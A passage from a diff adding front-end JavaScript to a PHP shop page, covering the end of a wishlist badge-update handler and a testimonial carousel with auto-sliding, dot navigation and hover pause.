+                currentCount = Math.max(0, currentCount - 1);
+            }
+
+            // ✅ Update wishlist badge
+            if (badge) {
+                badge.textContent = currentCount;
+                if (currentCount === 0) {
+                    badge.style.display = 'none';
+                }
+            } else if (currentCount > 0) {
+                // If badge doesn't exist, create it
+                const iconBlock = button.closest('.icon-blocks') || button.closest('[style*="relative"]');
+                if (iconBlock) {
+                    const newBadge = document.createElement('span');
+                    newBadge.className = 'badge';
+                    newBadge.id = 'wishlistBadge';
+                    newBadge.textContent = currentCount;
+                    iconBlock.appendChild(newBadge);
+                }
+            }
+        } else {
+            alert('Failed to update wishlist.');
+            button.innerHTML = originalHTML;
+        }
+    })
+    .catch(err => {
+        console.error('Wishlist error:', err);
+        alert('Network error.');
+        button.innerHTML = originalHTML;
+    })
+    .finally(() => {
+        button.disabled = false;
+    });
+}
+
+// Testimonial Carousel
+document.addEventListener('DOMContentLoaded', function () {
+    const carousel = document.getElementById('testimonialCarousel');
+    const dots = document.querySelectorAll('.indicator-dot');
+    const totalSlides = <?= count($testimonials) ?>;
+    let currentIndex = 0;
+    let autoSlideInterval;
+
+    if (totalSlides <= 1) return;
+
+    function updateCarousel() {
+        carousel.style.transform = `translateX(-${currentIndex * 100}%)`;
+        dots.forEach((dot, i) => {
+            dot.classList.toggle('active', i === currentIndex);
+        });
+    }
+
+    function nextSlide() {
+        currentIndex = (currentIndex + 1) % totalSlides;
+        updateCarousel();
+    }
+
+    function startAutoSlide() {
+        autoSlideInterval = setInterval(nextSlide, 6000);
+    }
+
+    function resetAutoSlide() {
+        clearInterval(autoSlideInterval);
+        startAutoSlide();
+    }
+
+    window.moveTestimonial = function(direction) {
+        currentIndex = (currentIndex + direction + totalSlides) % totalSlides;
+        updateCarousel();
+        resetAutoSlide();
+    };
+
+    dots.forEach((dot, index) => {
+        dot.addEventListener('click', () => {
+            currentIndex = index;
+            updateCarousel();
+            resetAutoSlide();
+        });
+    });
+
+    startAutoSlide();
+
+    const wrapper = document.querySelector('.testimonial-carousel-wrapper');
+    wrapper.addEventListener('mouseenter', () => clearInterval(autoSlideInterval));
+    wrapper.addEventListener('mouseleave', startAutoSlide);
+});
+</script>
+
+</body>
+</html>
